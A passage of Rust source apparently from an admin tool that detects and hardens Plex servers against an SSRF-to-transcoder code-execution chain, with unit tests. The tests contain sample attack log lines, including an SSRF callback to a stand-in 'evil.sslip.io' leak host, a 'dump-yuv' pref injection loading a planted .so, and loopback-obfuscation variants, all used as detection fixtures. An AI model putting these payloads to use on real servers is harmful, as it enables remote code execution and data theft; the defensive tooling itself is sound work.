    classify_codecs(codecs_dir, entries, prefs)
        .into_iter()
        .filter(|s| s.quarantinable)
        .map(|s| s.path)
        .collect()
}

/// **Harden a Plex server** against the companion-proxy SSRF / transcoder
/// `dump-yuv` RCE chain. DESTRUCTIVE: clears malicious Transcoder prefs,
/// moves suspect Codecs files into a root-owned 0700 quarantine dir (regular
/// files chmod 000, symlinks moved as links, never deleted), and can disable remote publishing, kill transcoders and restart
/// Plex. `dryRun` reports the plan without changing anything.
#[orca_tool(
    domain = "plex",
    verb = "security_harden",
    title = "Harden Plex (destructive)",
    role = "admin",
    execute_gated = false,
    dry_run_aware = true
)]
async fn plex_security_harden(
    args: PlexSecurityHardenArgs,
    ctx: &ToolCtx,
) -> Result<PlexSecurityHardenOutput> {
    let dry_run = ctx.dry_run();
    checked(args.runtime, args.target.as_deref(), &args.data_dir)?;
    if let Some(u) = args.run_as.as_deref() {
        if !valid_user(u) {
            bail!("invalid run_as {u:?}");
        }
    }
    let client = crate::tools::make_client(&args.endpoint)?;
    let mut errors = Vec::new();

    let prefs = client.prefs().await.context("read /:/prefs")?;
    let mut cleared_prefs = Vec::new();
    for id in prefs_to_clear(&prefs) {
        if dry_run {
            cleared_prefs.push(id);
            continue;
        }
        match client.set_pref(&id, "").await {
            Ok(()) => cleared_prefs.push(id),
            Err(e) => errors.push(format!("clear {id}: {e}")),
        }
    }

    let mut remote_disabled = false;
    if args.disable_remote && !dry_run {
        match client.set_pref("PublishServerOnPlexOnlineKey", "0").await {
            Ok(()) => remote_disabled = true,
            Err(e) => errors.push(format!("disable remote publishing: {e}")),
        }
    }

    let mut quarantine = Vec::new();
    let mut remaining = Vec::new();
    let mut transcoders_killed = false;
    let mut restarted = false;
    let mut user = None;
    if let Some(t) = args.target.as_deref() {
        let data_dir = args.data_dir.trim_end_matches('/');
        let codecs_dir = format!("{data_dir}/Codecs");
        match check_data_dir(args.runtime, t, data_dir).await {
            Err(e) => errors.push(format!("data_dir check: {e:#}")),
            Ok(out) => match args.run_as.clone() {
                Some(u) => user = Some(u),
                None => match parse_owner(&out) {
                    Ok(u) => user = Some(u),
                    Err(e) => errors.push(format!("resolve run_as: {e:#}")),
                },
            },
        }
        match (
            list_codec_entries(args.runtime, t, data_dir).await,
            user.as_deref(),
        ) {
            (Err(e), _) => errors.push(format!("{e:#}")),
            (Ok(_), None) => errors.push("quarantine skipped: no run_as user".to_string()),
            (Ok(entries), Some(_)) => {
                let qdir = quarantine_dir(&plugin_toolkit::time::Timestamp::now().compact());
                let suspects: Vec<CodecSuspect> = classify_codecs(&codecs_dir, &entries, &prefs)
                    .into_iter()
                    .filter(|s| s.quarantinable)
                    .collect();
                let mut qdir_ready = dry_run;
                if !dry_run && !suspects.is_empty() {
                    match make_quarantine_dir(args.runtime, t, &qdir).await {
                        Ok(()) => qdir_ready = true,
                        Err(e) => errors.push(format!("create quarantine dir: {e:#}")),
                    }
                }
                for s in suspects {
                    let dest = quarantine_path(&qdir, &codecs_dir, &s.path);
                    let error = if !safe_codec_path(data_dir, &s.path) {
                        Some("refused: path outside Codecs or unsafe".to_string())
                    } else if !qdir_ready {
                        Some("quarantine dir unavailable".to_string())
                    } else if dry_run {
                        None
                    } else {
                        quarantine_one(args.runtime, t, &codecs_dir, &s.path, &dest)
                            .await
                            .err()
                            .map(|e| format!("{e:#}"))
                    };
                    quarantine.push(QuarantineResult {
                        source: s.path,
                        dest,
                        reasons: s.reasons,
                        moved: !dry_run && error.is_none(),
                        error,
                    });
                }
                if !dry_run && !quarantine.is_empty() {
                    match list_codec_entries(args.runtime, t, data_dir).await {
                        Ok(after) => remaining = remaining_suspects(&codecs_dir, &after, &prefs),
                        Err(e) => errors.push(format!("re-check: {e:#}")),
                    }
                }
            }
        }

        if args.kill_transcoders && !dry_run {
            match user.as_deref() {
                None => errors.push("pkill skipped: Plex user unresolved".to_string()),
                Some(u) => {
                    let mut kill = guest(args.runtime, t);
                    kill.arg("pkill")
                        .arg("-x")
                        .arg("-u")
                        .arg(u)
                        .arg("Plex Transcoder");
                    match output_of(kill).await {
                        Ok((Some(0 | 1), _)) => transcoders_killed = true,
                        Ok((code, _)) => errors.push(format!("pkill transcoders exited {code:?}")),
                        Err(e) => errors.push(format!("{e:#}")),
                    }
                }
            }
        }

        if args.restart && !dry_run {
            let restart = PlexRestartArgs {
                runtime: args.runtime,
                vmid: t.parse().ok(),
                container: t.to_string(),
            };
            match lifecycle::restart_service(restart).await {
                Ok(_) => restarted = true,
                Err(e) => errors.push(format!("restart: {e:#}")),
            }
        }
    } else if args.kill_transcoders || args.restart {
        errors.push("kill_transcoders/restart need a target".to_string());
    }

    let mut follow_ups: Vec<String> = vec![FOLLOW_UPS[0].to_string()];
    if !restarted {
        follow_ups.push(FOLLOW_UPS[1].to_string());
    }
    if !quarantine.is_empty() {
        follow_ups.push(QUARANTINE_NOTE.to_string());
        follow_ups.push(RECHECK_NOTE.to_string());
    }
    if !remaining.is_empty() {
        follow_ups.push(format!(
            "{} Codecs suspects remain after quarantine; resolve them and re-check before killing transcoders or restarting",
            remaining.len()
        ));
    }

    Ok(PlexSecurityHardenOutput {
        dry_run,
        cleared_prefs,
        remote_disabled,
        remote_disable_planned: args.disable_remote,
        quarantine,
        run_as: user,
        remaining_suspects: remaining,
        transcoders_killed,
        restarted,
        errors,
        follow_ups,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn kv(v: &[(&str, &str)]) -> Vec<(String, String)> {
        v.iter()
            .map(|(a, b)| (a.to_string(), b.to_string()))
            .collect()
    }

    const D: &str = "/d/Codecs";

    fn entry(path: &str, mtime: f64, symlink: bool) -> CodecEntry {
        CodecEntry {
            path: format!("{D}/{path}"),
            mtime,
            symlink,
        }
    }

    #[test]
    fn version_threshold() {
        assert!(version_below("1.42.2.10156-f737b826c", MIN_PATCHED_VERSION));
        assert!(version_below("1.41.9.9999", MIN_PATCHED_VERSION));
        assert!(!version_below("1.42.2.10157-abc", MIN_PATCHED_VERSION));
        assert!(!version_below("1.43.0.1", MIN_PATCHED_VERSION));
    }

    #[test]
    fn detects_suspicious_prefs() {
        let prefs = kv(&[
            (
                "TranscoderH264Options",
                "dump-yuv=/x/Codecs/a-linux-x86_64/zz1.so:qp=0",
            ),
            ("TranscoderH264BackgroundPreset", "veryfast"),
            ("TranscoderHevcOptions", "  "),
            ("FriendlyName", "media"),
            ("SomeOtherPref", "/d/Codecs/evil"),
            ("LibPath", "x.so"),
        ]);
        let ids: Vec<String> = suspicious_prefs(&prefs)
            .into_iter()
            .map(|(i, _)| i)
            .collect();
        assert_eq!(
            ids,
            vec!["TranscoderH264Options", "SomeOtherPref", "LibPath"]
        );
        assert_eq!(prefs_to_clear(&prefs), vec!["TranscoderH264Options"]);
    }

    #[test]
    fn classifies_codec_filenames() {
        for n in [
            "libaac_decoder",
            "libaac_encoder",
            "libac3_decoder",
            "libdca_decoder",
            "libh264_decoder",
            "libhevc_decoder",
            "liblibmp3lame_encoder",
            "liblibx264_encoder",
            "libmp3_decoder",
            "libmpeg2video_decoder",
            "libmpeg4_decoder",
            "libpcm_bluray_decoder",
            "libvc1_decoder",
        ] {
            assert!(is_shipped_codec(&format!("{n}.so")), "{n}");
        }
        assert!(!is_shipped_codec("zz3.so"));
        assert!(!is_shipped_codec("lib_decoder.so"));
        assert!(!is_shipped_codec("libh264_decoder.so.bak"));
        assert!(!is_shipped_codec("libx-y_decoder.so"));
    }

    #[test]
    fn parses_find_print0() {
        let out = "1700000000.5 f /d/Codecs/a-linux-x86_64/lib h264_decoder.so\x001700000001.0 l /d/Codecs/x\0";
        let e = parse_find_output(out);
        assert_eq!(e.len(), 2);
        assert_eq!(e[0].path, "/d/Codecs/a-linux-x86_64/lib h264_decoder.so");
        assert!(!e[0].symlink);
        assert!(e[1].symlink);
    }

    #[test]
    fn clean_install_has_no_suspects() {
        let mut entries = vec![
            entry(".device-id", 100.0, false),
            entry("EasyAudioEncoder-abc-linux-x86_64.zip", 100.0, false),
            entry(
                "EasyAudioEncoder-abc-linux-x86_64/EasyAudioEncoder/eae",
                100.0,
                false,
            ),
        ];
        for n in [
            "aac_decoder",
            "h264_decoder",
            "hevc_decoder",
            "libx264_encoder",
        ] {
            entries.push(entry(&format!("abc-linux-x86_64/lib{n}.so"), 100.0, false));
        }
        assert!(classify_codecs(D, &entries, &[]).is_empty());
    }

    #[test]
    fn flags_foreign_symlink_mtime_and_pref_referenced() {
        let entries = vec![
            entry(".device-id", 100.0, false),
            entry("EasyAudioEncoder-abc-linux-x86_64.zip", 100.0, true),
            entry("abc-linux-x86_64/libaac_decoder.so", 100.0, false),
            entry("abc-linux-x86_64/libh264_decoder.so", 100.0, false),
            entry("abc-linux-x86_64/libhevc_decoder.so", 100.0, false),
            entry("abc-linux-x86_64/zz1.so", 100.0, false),
            entry("abc-linux-x86_64/libzz_decoder.so", 900_000.0, false),
            entry("abc-linux-x86_64/libvc1_decoder.so", 100.0, true),
            entry("abc-linux-x86_64/libmp3_decoder.so", 100.0, false),
        ];
        let prefs = kv(&[(
            "TranscoderH264Options",
            "dump-yuv=/d/Codecs/abc-linux-x86_64/libmp3_decoder.so",
        )]);
        let s = classify_codecs(D, &entries, &prefs);
        let paths: Vec<&str> = s
            .iter()
            .map(|x| x.path.rsplit('/').next().unwrap())
            .collect();
        assert_eq!(
            paths,
            vec![
                "EasyAudioEncoder-abc-linux-x86_64.zip",
                "zz1.so",
                "libzz_decoder.so",
                "libvc1_decoder.so",
                "libmp3_decoder.so"
            ]
        );
        assert!(!s[0].quarantinable);
        assert_eq!(s[2].reasons, vec![MTIME_REASON]);
        assert_eq!(s[2].severity, Severity::Warning);
        assert!(!s[2].quarantinable);
        assert!(s[1].quarantinable && s[3].quarantinable && s[4].quarantinable);
        assert!(s[4].reasons.iter().any(|r| r.contains("pref")));
    }

    #[test]
    fn lazily_fetched_codec_is_warning_not_quarantined() {
        let entries = vec![
            entry("abc-linux-x86_64/libaac_decoder.so", 100.0, false),
            entry("abc-linux-x86_64/libh264_decoder.so", 100.0, false),
            entry("abc-linux-x86_64/libhevc_decoder.so", 100.0, false),
            entry("abc-linux-x86_64/libvc1_decoder.so", 1_000_000.0, false),
        ];
        let s = classify_codecs(D, &entries, &[]);
        assert_eq!(s.len(), 1);
        assert_eq!(s[0].severity, Severity::Warning);
        assert!(!s[0].quarantinable);
    }

    #[test]
    fn deep_non_eae_files_are_flagged() {
        let entries = vec![
            entry("a/b/c/d/e/zz.so", 100.0, false),
            entry("EasyAudioEncoder-abc-linux-x86_64/a/b/c/eae", 100.0, false),
        ];
        let s = classify_codecs(D, &entries, &[]);
        assert_eq!(s.len(), 1);
        assert!(s[0].path.ends_with("e/zz.so"));
    }

    #[test]
    fn so_reference_needs_boundary() {
        assert!(value_is_suspicious("dump=/x/zz.so"));
        assert!(value_is_suspicious("zz.so:qp=0"));
        assert!(value_is_suspicious("a.so.1"));
        assert!(!value_is_suspicious("https://example.social/x"));
        assert!(!value_is_suspicious("also"));
        assert!(value_is_suspicious("x.so\"y"));
        assert!(value_is_suspicious("x.so/y"));
        assert!(value_is_suspicious("x.so2"));
        assert!(!value_is_suspicious("x.sox"));
    }

    #[test]
    fn path_safety() {
        assert!(valid_data_dir("/var/lib/plex"));
        assert!(!valid_data_dir("var/lib"));
        assert!(!valid_data_dir("/var/../etc"));
        assert!(safe_codec_path("/d", "/d/Codecs/a/zz.so"));
        assert!(!safe_codec_path("/d", "/d/Codecs/../x"));
        assert!(!safe_codec_path("/d", "/etc/passwd"));
        assert!(!safe_codec_path("/d", "/d/Codecs/a\nb"));
    }

    #[test]
    fn quarantine_path_keeps_origin_dir() {
        assert_eq!(
            quarantine_path("/q/1", "/d/Codecs", "/d/Codecs/a/b/abc-linux-x86_64/zz7.so"),
            format!(
                "/q/1/a__b__abc-linux-x86_64__zz7.so.{}.quarantined",
                short_hash("a/b/abc-linux-x86_64/zz7.so")
            )
        );
        assert_ne!(
            quarantine_path("/q", "/d/Codecs", "/d/Codecs/a__b/x.so"),
            quarantine_path("/q", "/d/Codecs", "/d/Codecs/a/b__x.so")
        );
        assert_eq!(quarantine_dir("s"), "/var/lib/orca-quarantine/plex/s");
    }

    #[test]
    fn quarantine_script_never_chmods_symlinks() {
        assert!(QUARANTINE_SH.contains(r#"if [ ! -L "$dest" ] && [ -f "$dest" ]"#));
        assert!(QUARANTINE_SH.contains(r#"mv -n -T -- "./$base" "$dest""#));
        assert!(QUARANTINE_SH.contains(r#"[ ! -L "$c" ]"#));
        assert_eq!(QUARANTINE_SH.matches("chmod").count(), 1);
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn symlink_suspect_moved_as_link_target_untouched() {
        use std::os::unix::fs::PermissionsExt;
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path().canonicalize().unwrap();
        let codecs = root.join("Codecs");
        let q = root.join("q");
        std::fs::create_dir_all(codecs.join("a")).unwrap();
        std::fs::create_dir(&q).unwrap();
        let victim = root.join("victim");
        std::fs::write(&victim, "x").unwrap();
        std::fs::set_permissions(&victim, std::fs::Permissions::from_mode(0o644)).unwrap();
        let link = codecs.join("a/evil.so");
        std::os::unix::fs::symlink(&victim, &link).unwrap();
        let dest = q.join("evil");
        let st = std::process::Command::new("sh")
            .arg("-c")
            .arg(QUARANTINE_SH)
            .arg("t")
            .arg(&link)
            .arg(&dest)
            .arg(&codecs)
            .status()
            .unwrap();
        assert!(st.success());
        assert!(std::fs::symlink_metadata(&dest)
            .unwrap()
            .file_type()
            .is_symlink());
        assert!(std::fs::symlink_metadata(&link).is_err());
        let mode = std::fs::metadata(&victim).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode, 0o644);
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn symlinked_parent_is_refused() {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path().canonicalize().unwrap();
        let codecs = root.join("Codecs");
        let outside = root.join("outside");
        std::fs::create_dir_all(&codecs).unwrap();
        std::fs::create_dir_all(&outside).unwrap();
        std::fs::write(outside.join("f.so"), "x").unwrap();
        std::os::unix::fs::symlink(&outside, codecs.join("a")).unwrap();
        let st = std::process::Command::new("sh")
            .arg("-c")
            .arg(QUARANTINE_SH)
            .arg("t")
            .arg(codecs.join("a/f.so"))
            .arg(root.join("dest"))
            .arg(&codecs)
            .status()
            .unwrap();
        assert!(!st.success());
        assert!(outside.join("f.so").exists());
    }

    #[test]
    fn root_owned_data_dir_default_is_refused() {
        assert!(parse_owner("0/root\n").is_err());
        assert_eq!(parse_owner("998/plex\n").unwrap(), "plex");
        assert!(parse_owner("998/UNKNOWN").is_err());
        assert!(parse_owner("garbage").is_err());
    }

    #[test]
    fn post_quarantine_rescan_reports_remaining() {
        let prefs = kv(&[]);
        let after = vec![
            entry("abc-linux-x86_64/libh264_decoder.so", 1000.0, false),
            entry("abc-linux-x86_64/x/payload.so", 1000.0, false),
        ];
        let left = remaining_suspects("/d/Codecs", &after, &prefs);
        assert_eq!(
            left,
            vec!["/d/Codecs/abc-linux-x86_64/x/payload.so".to_string()]
        );
        let clean = vec![entry("abc-linux-x86_64/libh264_decoder.so", 1000.0, false)];
        assert!(remaining_suspects("/d/Codecs", &clean, &prefs).is_empty());
    }

    #[test]
    fn short_form_ipv4_and_localhost_names() {
        for h in ["127.1", "0177.0.0.1", "0x7f.1", "127.0.0.1.", "2130706433"] {
            assert!(parse_host_ip(h).unwrap().is_loopback(), "{h}");
        }
        assert!(parse_host_ip("256.1.1.1").is_none());
        assert!(parse_host_ip("1.2.3.4.5").is_none());
        assert!(is_localhost_name("foo.localhost"));
        assert!(is_localhost_name("localhost."));
        assert!(!is_localhost_name("notlocalhost"));
        assert!(is_non_wan_ip("0.0.0.0"));
        assert!(is_non_wan_ip("::"));
        for host in ["127.1", "0x7f.1", "foo.localhost", "%25%33%31%32%37.0.0.1"] {
            let line = format!(
                "t [1] DEBUG - Request: [10.0.0.5:1 (Subnet)] GET /player/timeline/subscribe?protocol=http%3A%2F%2F{host}:32400/x"
            );
            assert_eq!(
                parse_ioc_line(&line).unwrap().severity,
                Severity::Critical,
                "{host}"
            );
        }
    }

    #[test]
    fn scrubs_secrets() {
        let s = scrub_tokens("GET /x?a=1&X-Plex-Token=SECRETTOKEN123&b=2");
        assert!(!s.contains("SECRETTOKEN123"));
        assert!(s.contains("&b=2"));
        let h = scrub_tokens("x-plex-token: ABCDEF0123 trailing");
        assert!(!h.contains("ABCDEF0123"));
        assert!(h.contains("trailing"));
        let a = scrub_tokens("?authToken=AAA111&plexToken=BBB222");
        assert!(!a.contains("AAA111") && !a.contains("BBB222"));
        let g =
            scrub_tokens("function/GetResultFromNetwork?url=http://evil.sslip.io:8080/leak/42# x");
        assert!(!g.contains("evil.sslip.io"));
        let l = scrub_tokens("GET /leak/SECRETID/more");
        assert!(!l.contains("SECRETID") && l.contains("/more"));
        let e = scrub_tokens("GET /x?X-Plex-Token%3DENCODED999%26b=2 tail");
        assert!(!e.contains("ENCODED999") && e.contains("tail"));
        let t = scrub_tokens("name TKN_abc123 tail");
        assert!(!t.contains("abc123") && t.contains("tail"));
    }

    const POLL: &str = "Oct 24, 2026 03:12:01.123 [140001] DEBUG - Request: [203.0.113.7:51514 (WAN)] GET /player/proxy/poll?deviceName=plexscan-deadbeef-1 (8 live) #1a2b Signed-in";
    const SUBSCRIBE: &str = "Oct 24, 2026 03:12:02.456 [140002] DEBUG - Request: [203.0.113.7:51515 (WAN)] GET /player/timeline/subscribe?commandID=1&protocol=http://127.0.0.1:32400/system/agents/z/searchOne?identifier=com.plexapp.agents.thetvdb/function/GetResultFromNetwork?url=http://evil.sslip.io:8080/leak/42#";
    const PREFS: &str = "Oct 24, 2026 03:13:00.000 [140003] DEBUG - Request: [203.0.113.7:51516 (WAN)] PUT /:/prefs?X-Plex-Token=FAKETOKEN999&TranscoderH264Options=dump-yuv=/x/zz1.so:qp=0";
    const LAN_POLL: &str = "Oct 24, 2026 03:14:00.000 [140004] DEBUG - Request: [10.0.0.5:40000 (Subnet)] GET /player/proxy/poll?deviceName=iPhone";

    #[test]
    fn parses_wan_poll() {
        let ioc = parse_ioc_line(POLL).unwrap();
        assert_eq!(ioc.indicator, "plexscan_player");
        assert_eq!(ioc.severity, Severity::Critical);
        assert_eq!(ioc.source_ip.as_deref(), Some("203.0.113.7"));
        assert_eq!(ioc.timestamp.as_deref(), Some("Oct 24, 2026 03:12:01.123"));
        assert!(ioc.wan);
    }

    #[test]
    fn parses_subscribe_callback_and_scrubs_url() {
        let ioc = parse_ioc_line(SUBSCRIBE).unwrap();
        assert_eq!(ioc.indicator, "timeline_subscribe_callback");
        assert_eq!(ioc.severity, Severity::Critical);
        assert!(!ioc.line.contains("evil.sslip.io"));
    }

    #[test]
    fn loopback_variants_are_critical_from_lan() {
        for host in [
            "localhost",
            "127.1.2.3",
            "0.0.0.0",
            "[::1]",
            "2130706433",
            "0x7f000001",
        ] {
            let line = format!(
                "t [1] DEBUG - Request: [10.0.0.5:1 (Subnet)] GET /player/timeline/subscribe?protocol=HTTPS%3A%2F%2F{host}:32400/x"
            );
            assert_eq!(
                parse_ioc_line(&line).unwrap().severity,
                Severity::Critical,
                "{host}"
            );
        }
        let lan = "t [1] DEBUG - Request: [10.0.0.5:1 (Subnet)] GET /player/timeline/subscribe?protocol=http&port=32500";
        assert_eq!(parse_ioc_line(lan).unwrap().severity, Severity::Warning);
    }

    #[test]
    fn parses_prefs_write_any_position_and_scrubs_token() {
        let ioc = parse_ioc_line(PREFS).unwrap();
        assert_eq!(ioc.indicator, "transcoder_pref_write");
        assert!(!ioc.line.contains("FAKETOKEN999"));
        let enc =
            "t [1] DEBUG - Request: [203.0.113.7:1 (WAN)] put /:/prefs?a=1&Foo=DUMP%2DYUV%3D/x.so";
        assert_eq!(
            parse_ioc_line(enc).unwrap().indicator,
            "transcoder_pref_write"
        );
    }

    #[test]
    fn lan_companion_poll_is_warning() {
        let ioc = parse_ioc_line(LAN_POLL).unwrap();
        assert_eq!(ioc.severity, Severity::Warning);
        assert!(!ioc.wan);
        let iocs = parse_iocs(&[POLL, LAN_POLL, SUBSCRIBE, PREFS, "noise"].join("\n"), &[]);
        assert_eq!(iocs.len(), 4);
    }

    #[test]
    fn subscribe_to_server_ip_is_critical() {
        let line = "t [1] DEBUG - Request: [10.0.0.5:1 (Subnet)] GET /player/timeline/subscribe?protocol=http://10.0.0.20:32400/x";
        assert_eq!(parse_ioc_line(line).unwrap().severity, Severity::Warning);
        let ips = vec!["10.0.0.20".to_string()];
        assert_eq!(
            parse_ioc_line_with(line, &ips).unwrap().severity,
            Severity::Critical
        );
        let mapped = "t [1] DEBUG - Request: [10.0.0.5:1 (Subnet)] GET /player/timeline/subscribe?protocol=http://[::ffff:127.0.0.1]:32400/x";
        assert_eq!(parse_ioc_line(mapped).unwrap().severity, Severity::Critical);
    }

    #[test]
    fn client_address_forms() {
        let cgnat = "t [1] DEBUG - Request: [100.64.1.2:1234] GET /player/proxy/poll";
        assert_eq!(parse_ioc_line(cgnat).unwrap().severity, Severity::Warning);
        let mapped = "t [1] DEBUG - Request: [[::ffff:10.0.0.9]:1234] GET /player/proxy/poll";
        let ioc = parse_ioc_line(mapped).unwrap();
        assert_eq!(ioc.source_ip.as_deref(), Some("::ffff:10.0.0.9"));
        assert!(!ioc.wan);
        let v6 = "t [1] DEBUG - Request: [2001:db8::1] GET /player/proxy/poll";
        let ioc = parse_ioc_line(v6).unwrap();
        assert_eq!(ioc.source_ip.as_deref(), Some("2001:db8::1"));
        assert!(ioc.wan);
    }
}
